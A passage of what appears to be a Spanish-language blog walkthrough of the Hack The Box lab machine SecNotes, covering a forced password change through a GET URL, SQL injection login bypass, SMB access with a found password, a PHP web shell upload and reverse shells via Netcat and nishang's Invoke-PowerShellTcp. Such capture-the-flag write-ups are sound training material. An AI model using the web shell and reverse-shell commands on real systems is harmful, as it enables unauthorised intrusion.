<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/20.png" alt="" /></p>

<p>Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos <code class="language-plaintext highlighter-rouge">Password</code> y <code class="language-plaintext highlighter-rouge">Confirm Password</code> de forma manual, los proporcionaremos a través de la propia URL.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/21.png" alt="" /></p>

<p>Para ello, desde <code class="language-plaintext highlighter-rouge">Burp Suite</code>, habiendo capturado la petición del cambio de contraseña, simplemente haremos <em>click derecho</em>, <em>Change request method</em>, y copiaremos la nueva petición por GET.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/22.png" alt="" /></p>

<p>De esta manera, si añadimos <em>http://10.10.10.97</em> al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/23.png" alt="" /></p>

<p>Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/24.png" alt="" /></p>

<p>Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con <em>Nmap</em>, el puerto <code class="language-plaintext highlighter-rouge">445</code> estaba abierto.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/25.png" alt="" /></p>

<h3 id="sql-injection"><a href="#header-3"></a>SQL Injection</h3>

<p>Otro vector a considerar al encontrarnos frente a un panel de login sería probar <a href="https://mateonitro550.github.io/SQL-Injection">Inyecciones SQL</a> con las cuales bypassear el panel.</p>

<p>Al igual que cuando aplicamos fuerza bruta sobre el campo <code class="language-plaintext highlighter-rouge">Username</code>, podemos ayudarnos de un diccionario como el mismo <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/sqli.auth.bypass.txt">SecLists</a>, el cual contiene una buena cantidad de expresiones que podemos probar.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/26.png" alt="" /></p>

<p>Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente <code class="language-plaintext highlighter-rouge">tyler</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/27.png" alt="" /></p>

<p>Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con <code class="language-plaintext highlighter-rouge">SMBMap</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.97 <span class="nt">-u</span> <span class="s1">'tyler'</span> <span class="nt">-p</span> <span class="s1">'92g!mA8BGj0irkL%0G*&amp;'</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/28.png" alt="" /></p>

<p>Podemos observar que tenemos permiso de lectura y escritura sobre el recurso <code class="language-plaintext highlighter-rouge">new-site</code>, echemos un vistazo de manera recursiva sobre este.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.97 <span class="nt">-u</span> <span class="s1">'tyler'</span> <span class="nt">-p</span> <span class="s1">'92g!mA8BGj0irkL%0G*&amp;'</span> <span class="nt">-R</span> <span class="s1">'new-site'</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/29.png" alt="" /></p>

<p>A partir de este punto empezaremos a trabajar con <code class="language-plaintext highlighter-rouge">smbclient</code>, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI).</p>

<p>Para saber de que se trata el contenido dentro del recurso <code class="language-plaintext highlighter-rouge">new-site</code> podemos descargarlo en nuestra máquina con el comando <code class="language-plaintext highlighter-rouge">get</code>, aunque podemos también intuirlo en base al nombre de los archivos, <code class="language-plaintext highlighter-rouge">IIS</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get iisstart.htm
get iisstart.png
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/30.png" alt="" /></p>

<p>Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto <code class="language-plaintext highlighter-rouge">8808</code>; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web.</p>

<p>Empecemos por subir algo simple como una <code class="language-plaintext highlighter-rouge">web shell</code>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="mf">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>put cmd.php
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/31.png" alt="" /></p>

<p>Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo <em>/cmd.php?cmd=comando</em> al url.</p>

<p>Podemos ejecutar <em>ipconfig</em> para corroborar que nos encontramos dentro de la máquina víctima.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png" alt="" /></p>

<p>O <em>whoami</em> para determinar que usuario somos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png" alt="" /></p>

<p>Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones:</p>

<p>Podemos usar <a href="https://eternallybored.org/misc/netcat/">Netcat</a>, para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>put nc64.exe
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png" alt="" /></p>

<p>Nos pondremos en escucha a través del puerto que determinemos.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p>Para finalmente a través del navegador añadir lo siguiente al url.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/cmd.php?cmd=nc64.exe -e cmd &lt;nuestraDirecciónIP&gt; &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png" alt="" /></p>

<p>O por su parte podemos usar <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> de <em>nishang</em>, para lo cual descargaremos el script.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
</code></pre></div></div>

<p>Añadimos lo siguiente al final del script.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerShellTcp -Reverse -IPAddress &lt;nuestraDirecciónIP&gt; -Port &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p>Lo subimos al servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>put Invoke-PowerShellTcp.ps1
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png" alt="" /></p>

<p>Nos ponemos en escucha a través del puerto que determinamos anteriormente.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt;
</code></pre></div></div>

<p>Para finalmente a través del navegador añadir lo siguiente al url.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png" alt="" /></p>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/38.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/39.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/40.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/41.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/42.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/43.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/44.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/45.png" alt="" /></p>

</article>

      </section>
    </div>
  </div>

   <footer>
  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
    <span>
        <b>m4teo</b>
    </span>
    
    <span>© 2023</span>
  </a>
</footer>


  
    <script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-219710333-2', 'auto');
  ga('send', 'pageview');
</script>
  
</body>

</html>
